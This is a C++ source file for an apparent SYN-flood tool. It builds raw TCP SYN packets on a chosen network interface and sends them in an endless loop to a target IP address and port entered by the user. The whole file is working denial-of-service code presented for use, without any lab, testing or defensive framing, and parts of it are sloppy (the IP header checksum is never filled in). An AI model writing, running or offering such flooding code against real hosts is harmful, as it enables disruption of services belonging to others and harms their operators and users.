#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>

// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// TCP header
struct tcp_header {
    u_int16_t source_port;
    u_int16_t dest_port;
    u_int32_t seq_number;
    u_int32_t ack_number;
    u_int16_t data_offset_res_flags;
    u_int16_t window;
    u_int16_t checksum;
    u_int16_t urgent_pointer;
};

// IP header
struct ip_header {
    u_int8_t ihl : 4;
    u_int8_t version : 4;
    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;
};

// Function to calculate the checksum
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Function to construct and send TCP packet
void send_tcp_packet(const std::string& iface_name, const std::string& dest_ip, uint16_t dest_port) {
    int sockfd;
    struct ifreq ifr;
    struct sockaddr_ll sa;
    struct ip_header iph;
    struct tcp_header tcph;
    struct pseudo_header psh;

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Get interface index
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Fill sockaddr_ll structure
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_protocol = htons(ETH_P_IP);

    // Ethernet header
    struct ethhdr eth;
    memset(&eth, 0, sizeof(eth));
    memset(eth.h_dest, 0xff, 6); // Broadcast address
    memset(eth.h_source, 0, 6);  // Placeholder source address
    eth.h_proto = htons(ETH_P_IP);

    // IP header
    memset(&iph, 0, sizeof(iph));
    iph.version = 4;
    iph.ihl = 5;
    iph.tos = 0;
    iph.tot_len = htons(sizeof(ip_header) + sizeof(tcp_header));
    iph.id = htons(54321);
    iph.frag_off = 0;
    iph.ttl = 64;
    iph.protocol = IPPROTO_TCP;
    iph.check = 0;
    iph.saddr = inet_addr("192.168.1.2"); // Replace with your source IP address
    iph.daddr = inet_addr(dest_ip.c_str());

    // TCP header
    memset(&tcph, 0, sizeof(tcph));
    tcph.source_port = htons(12345); // Replace with your source port
    tcph.dest_port = htons(dest_port);
    tcph.seq_number = 0;
    tcph.ack_number = 0;
    tcph.data_offset_res_flags = htons((5 << 12) | TH_SYN); // Flags: SYN
    tcph.window = htons(5840); // Maximum allowed window size
    tcph.checksum = 0; // Leave checksum 0 now, filled later by pseudo header
    tcph.urgent_pointer = 0;

    // Pseudo header for checksum calculation
    memset(&psh, 0, sizeof(psh));
    psh.source_address = iph.saddr;
    psh.dest_address = iph.daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(tcp_header));

    // Calculate TCP checksum
    int tcp_len = sizeof(tcp_header);
    char pseudo_tcp[tcp_len + sizeof(pseudo_header)];
    memcpy(pseudo_tcp, &psh, sizeof(pseudo_header));
    memcpy(pseudo_tcp + sizeof(pseudo_header), &tcph, tcp_len);
    tcph.checksum = checksum((unsigned short*)pseudo_tcp, sizeof(pseudo_tcp));

    // Construct packet
    uint8_t packet[ETH_FRAME_LEN];
    memcpy(packet, &eth, sizeof(eth));
    memcpy(packet + sizeof(eth), &iph, sizeof(iph));
    memcpy(packet + sizeof(eth) + sizeof(iph), &tcph, sizeof(tcph));

    // Send packet
    if (sendto(sockfd, packet, sizeof(eth) + sizeof(iph) + sizeof(tcph), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    std::cout << "TCP packet sent successfully" << std::endl;

    close(sockfd);
}

void flood(std::string iface_name, std::string dest_ip, uint16_t dest_port) {
    while (true)
    {
        send_tcp_packet(iface_name, dest_ip, dest_port);
    }
    
}

int main() {
    std::string iface_name;
    std::string dest_ip;
    uint16_t dest_port;

    std::cout << "Enter Interface Name >> "; std::cin >> iface_name;
    std::cout << "Enter IP Adrress Target >> "; std::cin >> dest_ip;
    std::cout << "Enter Port Target >> "; std::cin >> dest_port;

    flood(iface_name, dest_ip, dest_port);

    return 0;
}